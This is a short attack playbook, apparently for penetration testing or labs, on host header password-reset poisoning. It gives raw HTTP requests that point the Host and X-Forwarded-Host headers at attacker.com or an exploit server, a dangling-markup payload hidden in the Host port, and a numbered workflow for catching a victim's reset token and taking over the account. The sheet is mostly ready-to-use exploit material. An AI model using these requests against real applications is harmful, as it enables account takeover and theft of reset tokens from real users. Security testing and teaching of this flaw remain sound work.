# Host Header — Password Reset Poisoning

## When this applies

- Application emails password-reset links that include the request's Host header (or `X-Forwarded-Host`).
- An attacker can submit `POST /forgot-password` for the victim's account with a controlled Host.
- Goal: redirect the victim's reset link to attacker.com, capture the token, take over the account.

## Technique

POST a password-reset request for the victim's username. Set Host to attacker-controlled domain. The server emails a link like `https://attacker.com/reset?token=...` to the victim's address. When the victim clicks (or any access logger captures), the token leaks.

## Steps

### Indicators

- Password reset functionality exists
- Reset emails contain links with tokens
- Host header reflected in email URLs

### Exploitation

```http
POST /forgot-password HTTP/1.1
Host: YOUR-EXPLOIT-SERVER.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

username=victim
```

**Check:** Access logs on your server for captured tokens.

### Workflow

```
1. Request password reset for test account (with your own Host)
2. Confirm the email link uses the Host you set
3. Intercept POST /forgot-password
4. Send to Repeater
5. Change Host to exploit server, change username to victim
6. Send request
7. Wait for victim to click the link
8. Capture token from your access log
9. Use token at the legitimate domain to reset victim's password
```

### Override headers (when Host is validated)

```http
X-Forwarded-Host: attacker.com
X-Forwarded-Server: attacker.com
X-HTTP-Host-Override: attacker.com
X-Host: attacker.com
Forwarded: host=attacker.com
```

```http
GET / HTTP/1.1
Host: legitimate.com
X-Forwarded-Host: attacker.com
```

### Dangling markup injection (when Host is validated but port is not)

If passwords are sent in email body and the Host header allows arbitrary ports:

```http
POST /forgot-password HTTP/1.1
Host: legitimate-domain.com:'<a href="//attacker.com/?
Content-Type: application/x-www-form-urlencoded

username=victim
```

The HTML email's link captures everything after the injection (including the password / token in body content).

## Verifying success

- Your access log receives a request with the token in the path/query.
- The token, when submitted at the legitimate domain, resets the victim's password.
- Different victims yield different tokens — confirms the host-poison vector.

## Common pitfalls

- Some apps only honor `Host`, not override headers — confirm by sending only the override.
- Cookies / SameSite may block the click in some browsers — use a "click-required" link.
- Email HTML sanitization may neutralize dangling-markup payloads — try plain-text email mode.

## Tools

- Burp Suite Repeater
- Public listener (RequestBin, ngrok, simple `python3 -m http.server`)
- Catch-all email service (Mailosaur, mail.tm) for confirmation pickup
